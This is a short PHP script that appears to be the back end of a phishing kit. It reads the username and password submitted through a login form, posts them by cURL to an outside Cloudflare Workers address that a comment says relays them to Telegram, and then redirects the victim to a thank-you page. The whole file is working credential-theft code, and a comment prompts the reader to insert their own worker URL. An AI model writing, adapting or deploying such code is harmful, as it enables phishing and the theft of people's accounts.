<?php

// Collect the form data (username and password)
$username = $_POST['username'];
$password = $_POST['password'];

// URL of the worker that will handle the form data and send it to Telegram
$worker_url = 'https://aut0-curr-9dc7.henrycrane65.workers.dev';  // Update with your Worker URL

// Create the payload to send to the worker
$data = json_encode([
    'username' => $username,
    'password' => $password,
]);

// Initialize cURL session
$ch = curl_init($worker_url);

// Set cURL options
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'Content-Length: ' . strlen($data),
]);

// Execute the request and capture the response
$response = curl_exec($ch);

// Check for errors in the request
if(curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}

// Close the cURL session
curl_close($ch);

// Redirect after sending data to the worker
header("Location: ./thanks.html");
exit();

?>
